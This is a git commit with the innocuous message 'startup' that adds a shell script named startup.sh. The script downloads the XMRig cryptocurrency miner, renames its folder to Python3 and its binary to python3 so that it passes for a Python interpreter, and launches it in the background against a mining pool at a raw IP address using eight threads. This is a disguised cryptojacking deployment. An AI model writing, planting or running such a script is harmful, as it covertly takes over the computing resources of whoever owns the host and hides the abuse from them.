68890ad090065a6611eee82ab7f043be29fda0c3
Akuy245338 <113159911+Akuy245338@users.noreply.github.com>
2022-09-09 11:24:16 +0700

    startup

---
+++ startup.sh
@@ -0,0 +1,6 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -zxf xmrig-6.18.0-linux-x64.tar.gz 
+rm xmrig-6.18.0-linux-x64.tar.gz
+mv xmrig-6.18.0 Python3 
+cd Python3 
+mv xmrig python3 
+./python3 --donate-level 0 -o 47.250.38.10:5302 -u MINER -p x -k -a rx/0 --threads=8 -B
